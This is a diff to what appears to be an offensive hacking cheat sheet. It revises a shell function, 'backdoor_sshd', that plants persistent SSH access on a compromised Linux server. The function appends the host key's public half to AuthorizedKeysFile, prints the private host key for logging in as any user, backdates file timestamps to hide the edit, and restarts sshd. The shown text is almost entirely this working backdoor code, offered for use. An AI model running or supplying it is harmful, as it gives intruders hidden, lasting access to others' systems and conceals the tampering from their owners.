@@ -1808,15 +1808,16 @@ Adding your key to *authorized_keys* is overused 😩. Instead, as root, cut & p
 
 ```shell
 backdoor_sshd() {
-	local K="/etc/ssh/ssh_host_ed25519_key"
-	local D="/etc/ssh/sshd_config.d"
+	local B="/etc/ssh"
+	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
 	local N=$(cd "${D}" || exit; shopt -s nullglob; echo *.conf)
 	[ -n "$N" ] && N="${N%%\.conf*}.conf"
 	N="${D}/${N:-50-cloud-init.conf}"
 	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
-	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && return
-	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
+	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking in sshd_config"
 	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
+	grep -qm1 '^AuthorizedKeysFile' "$N" && { echo >&2 "WARN: Already backdoored"; return; }
+	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
 	touch -r "$K" "$N" "$D" \
 	&& declare -f ctime >/dev/null && ctime "$N" "$D"
 	systemctl restart ssh
